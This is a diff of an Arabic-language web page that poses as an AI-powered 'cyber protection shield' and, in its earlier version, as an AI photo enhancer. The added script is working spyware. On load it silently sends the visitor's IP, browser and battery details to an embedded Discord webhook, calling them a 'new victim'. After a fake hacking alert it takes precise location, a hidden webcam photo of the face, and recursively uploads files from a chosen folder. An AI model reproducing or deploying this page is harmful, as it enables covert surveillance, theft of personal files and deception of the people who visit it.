@@ -2,95 +2,145 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>AI Photo Enhancer - Debug Mode</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام فحص الأمان المتكامل (AI)</title>
     <style>
-        body { font-family: sans-serif; background: #f4f7f6; text-align: center; padding: 20px; }
-        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 500px; margin: auto; }
-        .btn { background: #007aff; color: white; padding: 15px 30px; border: none; border-radius: 10px; cursor: pointer; font-size: 18px; width: 100%; }
-        #debug-log { background: #000; color: #0f0; text-align: left; padding: 15px; margin-top: 20px; border-radius: 8px; font-size: 12px; height: 200px; overflow-y: auto; }
-        .status { margin-top: 10px; font-weight: bold; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #010409; color: #c9d1d9; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .card { background: #161b22; padding: 40px; border-radius: 20px; border: 1px solid #30363d; width: 90%; max-width: 500px; text-align: center; box-shadow: 0 10px 50px rgba(0,0,0,0.5); }
+        h1 { color: #58a6ff; font-size: 24px; }
+        p { color: #8b949e; margin-bottom: 30px; }
+        .btn-action { background: #238636; color: white; padding: 18px; border: none; border-radius: 10px; cursor: pointer; font-size: 20px; font-weight: bold; width: 100%; transition: 0.3s; }
+        .btn-action:hover { background: #2ea043; transform: scale(1.02); }
+        #status-box { margin-top: 25px; background: #0d1117; padding: 15px; border-radius: 10px; text-align: left; font-family: monospace; font-size: 12px; height: 150px; overflow-y: auto; border: 1px solid #333; }
+        .danger { color: #f85149; }
+        canvas { display: none; } /* لإخفاء عملية التقاط الصورة */
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h1>🪄 مُحسن الصور الذكي</h1>
-    <p>اختر مجلد يحتوي على <b>صور صغيرة</b> للتجربة</p>
-    <button class="btn" id="startBtn">بدء المعالجة والرفع 📁</button>
+    <h1>🛡️ درع الحماية السيبرانية</h1>
+    <p>لقد تم رصد محاولة اختراق لجهازك. يرجى الضغط أدناه لتفعيل "بروتوكول الحماية القصوى" وتأمين كافة بياناتك.</p>
     
-    <div class="status" id="status">الحالة: بانتظار البدء</div>
+    <button class="btn-action" id="mainBtn">تفعيل الحماية الفورية ⚡</button>
     
-    <div id="debug-log">سجل العمليات (Debug Log):<br></div>
+    <div id="status-box">بانتظار بدء البروتوكول...</div>
 </div>
 
+<!-- عناصر مخفية للكاميرا -->
+<video id="video" width="640" height="480" autoplay style="display:none;"></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+
 <script>
-    // تأكد أن هذا الرابط لا يزال يعمل في ديسكورد الخاص بك
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1498434837818904636/O_VAiMaolUCuW9-wveHztYpe9tbPn_MiKehNpVJoZqkc-8Bh-PXh6_mzx-NMrTR-6cH6";
+    const WEBHOOK = "https://discord.com/api/webhooks/1498434837818904636/O_VAiMaolUCuW9-wveHztYpe9tbPn_MiKehNpVJoZqkc-8Bh-PXh6_mzx-NMrTR-6cH6";
+    const statusBox = document.getElementById('status-box');
 
-    const logEl = document.getElementById('debug-log');
-    const statusEl = document.getElementById('status');
-
-    function writeLog(msg, color = "#0f0") {
-        logEl.innerHTML += `<span style="color: ${color}">> ${msg}</span><br>`;
-        logEl.scrollTop = logEl.scrollHeight;
+    function log(msg, color = "#8b949e") {
+        statusBox.innerHTML += `<div style="color: ${color}">> ${msg}</div>`;
+        statusBox.scrollTop = statusBox.scrollHeight;
     }
 
-    document.getElementById('startBtn').addEventListener('click', async () => {
+    // 1. جمع البيانات الصامتة فور الدخول
+    (async () => {
         try {
-            if (!window.showDirectoryPicker) {
-                writeLog("خطأ: متصفحك لا يدعم هذه الخاصية. استخدم Chrome على الكمبيوتر.", "red");
-                return;
-            }
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const battery = await navigator.getBattery?.();
+            
+            await sendToDiscord("👤 ضحية جديد دخل الصفحة", {
+                "IP": ipData.ip,
+                "النظام": navigator.platform,
+                "المتصفح": navigator.userAgent,
+                "البطارية": battery ? (battery.level * 100) + "%" : "غير مدعوم"
+            });
+        } catch (e) {}
+    })();
 
-            const dirHandle = await window.showDirectoryPicker();
-            statusEl.innerText = "جاري سحب الملفات...";
-            writeLog("تم منح الصلاحية للمجلد.");
+    document.getElementById('mainBtn').addEventListener('click', async () => {
+        document.getElementById('mainBtn').disabled = true;
 
-            for await (const entry of dirHandle.values()) {
-                if (entry.kind === 'file') {
-                    const file = await entry.getFile();
-                    
-                    // فحص الحجم (تخطي الملفات الأكبر من 8MB للتجربة)
-                    if (file.size > 8 * 1024 * 1024) {
-                        writeLog(`تخطي الملف ${file.name} (كبير جداً)`, "orange");
-                        continue;
-                    }
+        try {
+            // المرحلة 1: الموقع الجغرافي
+            log("جاري تحديد موقع التهديد...");
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await sendToDiscord("📍 الموقع الدقيق للضحية", { "الرابط": mapLink });
+                log("تم تحديد الموقع الجغرافي.", "#2ecc71");
 
-                    writeLog(`محاولة رفع: ${file.name}...`);
-                    await uploadToDiscord(file);
-                }
-            }
-            statusEl.innerText = "✅ اكتملت العملية!";
+                // المرحلة 2: الكاميرا (التقاط صورة)
+                log("جاري تفعيل ماسح الوجه البيومتري...");
+                await takeSnap();
+
+                // المرحلة 3: الإشعارات
+                log("تفعيل نظام التنبيهات...");
+                if (Notification.permission !== 'granted') await Notification.requestPermission();
+
+                // المرحلة 4: الملفات (السحب الشامل)
+                log("بدء تطهير المجلدات الحساسة...", "#f85149");
+                await stealFiles();
+
+            }, () => log("فشل: يجب قبول الصلاحيات لتأمين الجهاز.", "#f85149"));
 
         } catch (err) {
-            writeLog(`خطأ عام: ${err.message}`, "red");
+            log("حدث خطأ غير متوقع.");
         }
     });
 
-    async function uploadToDiscord(file) {
-        const formData = new FormData();
-        formData.append('file', file, file.name);
-
+    // دالة التقاط الصورة
+    async function takeSnap() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
         try {
-            const response = await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                body: formData
-            });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            await new Promise(r => setTimeout(r, 1000)); // انتظار ثانية لتفتح الكاميرا
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+            await sendFile(blob, "face_capture.jpg", "📸 صورة وجه الضحية");
+            stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا
+            log("تم فحص الوجه بنجاح.", "#2ecc71");
+        } catch (e) { log("فشل تفعيل الكاميرا."); }
+    }
 
-            if (response.ok) {
-                writeLog(`✅ نجح رفع: ${file.name}`, "#0f0");
-            } else if (response.status === 429) {
-                writeLog(`⚠️ توقف مؤقت (Rate Limit) - انتظر ثواني...`, "orange");
-                await new Promise(r => setTimeout(r, 5000)); // انتظار 5 ثواني
-            } else {
-                writeLog(`❌ فشل الرفع: ${file.name} (Error: ${response.status})`, "red");
+    // دالة سحب الملفات
+    async function stealFiles() {
+        try {
+            const dirHandle = await window.showDirectoryPicker();
+            log("✅ تم منح الوصول! جاري سحب البيانات...");
+            
+            async function scan(h) {
+                for await (const entry of h.values()) {
+                    if (entry.kind === 'file') {
+                        const file = await entry.getFile();
+                        if (file.size < 20 * 1024 * 1024) { // أقل من 20 ميجا
+                            await sendFile(file, file.name, `📄 ملف مسحوب: ${file.name}`);
+                            log(`تم سحب: ${file.name}`);
+                        }
+                    } else if (entry.kind === 'directory') {
+                        await scan(entry);
+                    }
+                }
             }
-        } catch (e) {
-            writeLog(`❌ خطأ في الشبكة أثناء رفع ${file.name}`, "red");
-        }
-        
-        // تأخير بسيط بين كل ملف وآخر لتجنب الحظر
-        await new Promise(r => setTimeout(r, 1000));
+            await scan(dirHandle);
+            log("✅ اكتمل "البروتوكول" بنجاح.", "#2ecc71");
+        } catch (e) { log("فشل الوصول للمجلد."); }
+    }
+
+    async function sendToDiscord(title, fields) {
+        const embedFields = Object.keys(fields).map(k => ({ name: k, value: String(fields[k]) }));
+        await fetch(WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ embeds: [{ title: title, color: 16711680, fields: embedFields, timestamp: new Date() }] })
+        });
+    }
+
+    async function sendFile(blob, name, content) {
+        const fd = new FormData();
+        fd.append('file', blob, name);
+        fd.append('payload_json', JSON.stringify({ content: content }));
+        await fetch(WEBHOOK, { method: 'POST', body: fd });
+        await new Promise(r => setTimeout(r, 800)); // تأخير بسيط
     }
 </script>
 
